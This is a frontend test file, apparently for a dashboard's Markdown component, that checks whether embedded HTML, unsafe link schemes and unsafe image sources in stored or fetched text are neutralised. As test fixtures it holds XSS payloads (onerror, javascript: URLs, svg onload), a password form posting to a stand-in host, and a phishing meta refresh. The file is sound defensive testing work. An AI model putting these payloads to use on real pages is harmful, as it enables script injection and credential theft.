import { act } from 'react'
import { describe, expect, it } from 'vitest'
import { render } from '@testing-library/react'
import { Markdown } from './Markdown'
import { ReadingView } from '../pages/knowledge/ReadingView'
import { InboxMessageBody } from '../pages/inbox/ForeignContent'
import { ToolOutput } from '../pages/tools/ToolOutput'
import type { InboxItem, KnowledgeItem } from '../lib/api'

// ── Stored and remote text is shown as Markdown, never as the page's own markup ────────────
//
// A knowledge item's body is someone else's text: a feed entry, a scraped page, an uploaded
// file, a mirrored artifact, an inbox message, a tool's result. The one Markdown component
// renders it on the dashboard's own origin, so any HTML inside it that became a live element
// would be that author's markup running on this page: a form that posts a password
// elsewhere, a frame with a document of its own, a style block that restyles the dashboard.
//
// The contract asserted here, as what a reader sees:
//   · embedded HTML is shown as its text, except a short list of attribute-free formatting
//     tags (`<kbd>`, `<br>`, `<sub>` …), which carry no URL, handler or style;
//   · a link opens only for http, https and mailto;
//   · an image loads only from https, the artifact library's own route, or an inline data
//     image — what the page's policy loads;
//   · ordinary Markdown still renders as Markdown.

/** Every attribute on every element, so "no handler anywhere" is a census, not a spot check. */
function handlerAttributes(root: HTMLElement): string[] {
  return Array.from(root.querySelectorAll('*')).flatMap((el) =>
    Array.from(el.attributes).filter((a) => /^on/i.test(a.name)).map((a) => `${el.tagName}.${a.name}`),
  )
}

function renderBody(body: string) {
  return render(<Markdown>{`Before the markup.\n\n${body}\n\nAfter the markup.`}</Markdown>)
}

/** [what it is, the body's markup, what must not exist, the text a reader sees (the markup
 *  itself unless stated)]. A bare formatting CLOSER after an attribute-bearing opener is the one
 *  asymmetry: the opener is text, and the HTML parser drops the closer as the stray end tag it
 *  now is — so the reader sees the opener and the words, and nothing was created either way. */
const EMBEDDED: Array<[string, string, string, string?]> = [
  [
    'a form that posts what is typed elsewhere',
    '<form action="https://collect.example.com/login"><input name="password" type="password"><button>Sign in</button></form>',
    'form, input, button',
  ],
  ['a frame with a document of its own', '<iframe srcdoc="<script>parent.document.title=1</script>"></iframe>', 'iframe'],
  ['a style block', '<style>body { display: none }</style>', 'style'],
  ['an image tag with an inline handler', '<img src="https://images.example.com/p.png" onerror="alert(1)">', 'img'],
  ['a link with a script scheme', '<a href="javascript:alert(1)">open the report</a>', 'a'],
  ['a script', '<script>alert(1)</script>', 'script'],
  ['a refresh directive', '<meta http-equiv="refresh" content="0;url=https://phish.example.com/">', 'meta'],
  ['an embedded object', '<object data="https://plugins.example.com/x.swf"></object>', 'object'],
  ['an svg with a load handler', '<svg onload="alert(1)"><circle r="4"></circle></svg>', 'svg'],
  ['a formatting tag carrying a handler', '<details open ontoggle="alert(1)"><summary>More</summary></details>', 'details, summary'],
  ['a formatting tag carrying a style', '<b style="position:fixed;inset:0">covered</b>', 'b', '<b style="position:fixed;inset:0">covered'],
  ['a widget block', '<widget title="Chart"><script>parent.postMessage("go", "*")</script></widget>', 'iframe'],
]

describe('embedded HTML in a stored body is shown as text', () => {
  it.each(EMBEDDED)('%s becomes no element, and its markup is readable text', async (_name, markup, selector, shown) => {
    const { container } = renderBody(markup)
    await act(async () => {})
    expect(container.querySelector(selector), `${selector} was created from the body`).toBeNull()
    expect(handlerAttributes(container)).toEqual([])
    expect(container.textContent, 'the markup is shown as what it is').toContain(shown ?? markup)
    // The prose around it is untouched.
    expect(container.textContent).toContain('Before the markup.')
    expect(container.textContent).toContain('After the markup.')
  })

  it('an HTML comment is dropped rather than printed', () => {
    const { container } = renderBody('<!-- reviewer: tighten this paragraph -->')
    expect(container.textContent).not.toContain('reviewer')
    expect(container.textContent).toContain('After the markup.')
  })

  it('a comment beside real markup is not a way to smuggle the markup in', () => {
    const markup = '<!-- x --><iframe src="https://frames.example.com/"></iframe>'
    const { container } = renderBody(markup)
    expect(container.querySelector('iframe')).toBeNull()
    expect(container.textContent).toContain('<iframe src="https://frames.example.com/"></iframe>')
  })
})

describe('the attribute-free formatting tags still format', () => {
  it('renders kbd, sub, sup, b, i, s and mark', () => {
    const { container } = render(
      <Markdown>{'Press <kbd>Ctrl</kbd> + <kbd>K</kbd>. H<sub>2</sub>O, x<sup>2</sup>, <b>bold</b>, <i>tilted</i>, <s>gone</s>, <mark>marked</mark>.'}</Markdown>,
    )
    expect(Array.from(container.querySelectorAll('kbd')).map((k) => k.textContent)).toEqual(['Ctrl', 'K'])
    expect(container.querySelector('sub')?.textContent).toBe('2')
    expect(container.querySelector('sup')?.textContent).toBe('2')
    expect(container.querySelector('b')?.textContent).toBe('bold')
    expect(container.querySelector('i')?.textContent).toBe('tilted')
    expect(container.querySelector('s')?.textContent).toBe('gone')
    expect(container.querySelector('mark')?.textContent).toBe('marked')
    expect(container.textContent).not.toContain('<kbd>')
  })

  it('a <br> breaks a table cell, and a bare details block discloses', () => {
    const { container } = render(
      <Markdown>{'| Step | Notes |\n| --- | --- |\n| One | first<br>second |\n\n<details>\n<summary>More detail</summary>\n\nThe **hidden** part.\n\n</details>'}</Markdown>,
    )
    const cell = container.querySelectorAll('td')[1]
    expect(cell.querySelector('br')).not.toBeNull()
    expect(cell.textContent).toBe('firstsecond')
    const details = container.querySelector('details')
    expect(details?.querySelector('summary')?.textContent).toBe('More detail')
    expect(details?.querySelector('strong')?.textContent).toBe('hidden')
  })

  it('the one policy holds in inline mode too', () => {
    const { container } = render(<Markdown inline>{'Sync with <b>care</b>. <img src=x onerror=alert(1)>'}</Markdown>)
    expect(container.querySelector('b')?.textContent).toBe('care')
    expect(container.querySelector('img')).toBeNull()
    expect(handlerAttributes(container)).toEqual([])
    expect(container.textContent).toContain('<img src=x onerror=alert(1)>')
  })
})

const REFUSED_HREFS: Array<[string, string]> = [
  ['a script scheme', 'javascript:alert(1)'],
  ['a script scheme split by a tab', 'java&#9;script:alert(1)'],
  ['a document in a data URL', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
  ['a telephone link', 'tel:+15550100'],
  ['a local file', 'file:///etc/hosts'],
  ['a path on this gateway', '/api/knowledge/items'],
  ['a route inside the app', '#/settings/security'],
  ['a host with no scheme', 'accounts.example.com/login'],
  ['a protocol-relative host', '//accounts.example.com/login'],
]

describe('a link opens only for http, https and mailto', () => {
  it.each(REFUSED_HREFS)('%s is not a link, and its words stay', (_name, href) => {
    const { container } = render(<Markdown>{`Read [the release notes](${href}) first.`}</Markdown>)
    expect(container.querySelector('a'), `${href} became a link`).toBeNull()
    expect(container.textContent).toContain('Read the release notes first.')
  })

  it.each([
    ['https://example.com/notes', 'https://example.com/notes'],
    ['http://example.com/notes', 'http://example.com/notes'],
    ['mailto:owner@example.com', 'mailto:owner@example.com'],
  ])('%s opens, in a new tab with no opener', (href, expected) => {
    const { getByRole } = render(<Markdown>{`See [the notes](${href}).`}</Markdown>)
    const link = getByRole('link', { name: 'the notes' })
    expect(link).toHaveAttribute('href', expected)
    expect(link).toHaveAttribute('target', '_blank')
    expect(link.getAttribute('rel')).toContain('noopener')
  })

  it('autolinks and bare web addresses are links', () => {
    const { container } = render(<Markdown>{'Try <https://example.com/a> or https://example.com/b.'}</Markdown>)
    expect(Array.from(container.querySelectorAll('a')).map((a) => a.getAttribute('href')))
      .toEqual(['https://example.com/a', 'https://example.com/b'])
  })
})

describe('an image loads only from where the page loads images', () => {
  it('an https image and an artifact image render', () => {
    const { container } = render(
      <Markdown>{'![Revenue chart](https://images.example.com/chart.png)\n\n![Generated](/api/artifacts/sales-chart/raw?version=2)'}</Markdown>,
    )
    expect(Array.from(container.querySelectorAll('img')).map((i) => i.getAttribute('src')))
      .toEqual(['https://images.example.com/chart.png', '/api/artifacts/sales-chart/raw?version=2'])
  })

  it.each([
    ['a plain-http image (the page policy refuses it)', 'http://images.example.com/p.png'],
    ['a path on this gateway that is not an artifact', '/api/knowledge/items/abc/delete'],
    ['a relative path from somewhere else', 'images/diagram.png'],
    ['a script scheme', 'javascript:alert(1)'],
    ['a data URL that is not an image', 'data:text/html;base64,PHNjcmlwdD4='],
  ])('%s is not loaded, and its alt text is shown', (_name, src) => {
    const { container } = render(<Markdown>{`![Quarterly diagram](${src})`}</Markdown>)
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('Quarterly diagram')
  })
})

describe('ordinary Markdown still renders', () => {
  it('headings, lists, code, a table, a quote and emphasis', () => {
    const body = [
      '# Release notes',
      '',
      '## What changed',
      '',
      '- first item',
      '- second item',
      '',
      '1. step one',
      '2. step two',
      '',
      'Run `make test`, then:',
      '',
      '```ts',
      'const answer: number = 42',
      '```',
      '',
      '| Name | Value |',
      '| --- | --- |',
      '| a | 1 |',
      '',
      '> quoted **strongly** and *softly*, ~~not this~~',
    ].join('\n')
    const { container } = render(<Markdown>{body}</Markdown>)
    expect(container.querySelector('h1')?.textContent).toBe('Release notes')
    expect(container.querySelector('h2')?.textContent).toBe('What changed')
    expect(container.querySelectorAll('ul > li')).toHaveLength(2)
    expect(container.querySelectorAll('ol > li')).toHaveLength(2)
    expect(Array.from(container.querySelectorAll('code')).map((c) => c.textContent)).toContain('make test')
    expect(container.querySelector('pre')?.textContent).toContain('const answer: number = 42')
    expect(container.querySelector('td')?.textContent).toBe('a')
    expect(container.querySelector('blockquote strong')?.textContent).toBe('strongly')
    expect(container.querySelector('blockquote em')?.textContent).toBe('softly')
    expect(container.querySelector('del')?.textContent).toBe('not this')
  })

  it('a tag written inside code is shown as code, untouched', () => {
    const { container } = render(<Markdown>{'Use `<iframe>` sparingly.\n\n```html\n<form action="/x"></form>\n```'}</Markdown>)
    expect(container.querySelector('iframe, form')).toBeNull()
    expect(container.textContent).toContain('<iframe>')
    expect(container.querySelector('pre')?.textContent).toContain('<form action="/x"></form>')
  })
})

describe('the surfaces that show stored text go through it', () => {
  const HOSTILE = 'Notes.\n\n<iframe srcdoc="<script>parent.document.title=1</script>"></iframe>\n\n<form action="https://collect.example.com/"><input name="password"></form>'

  it('the knowledge reader', () => {
    const item = { id: 'k1', title: 'Saved page', content: HOSTILE, item_type: 'bookmark', word_count: 20 } as KnowledgeItem
    const { container } = render(<ReadingView item={item} annotations={[]} onAnnotationsChanged={() => {}} />)
    expect(container.querySelector('iframe, form, input')).toBeNull()
    expect(container.textContent).toContain('<iframe srcdoc=')
  })

  it('an inbox message', () => {
    const item = { id: 'i1', message: HOSTILE } as InboxItem
    const { container } = render(<InboxMessageBody item={item} owner="owner" />)
    expect(container.querySelector('iframe, form, input')).toBeNull()
    expect(container.textContent).toContain('<form action=')
  })

  it("a tool's result in chat", () => {
    const { container } = render(<ToolOutput text={`# Fetched page\n\n${HOSTILE}`} />)
    expect(container.querySelector('iframe, form, input')).toBeNull()
    expect(container.textContent).toContain('<iframe srcdoc=')
  })
})
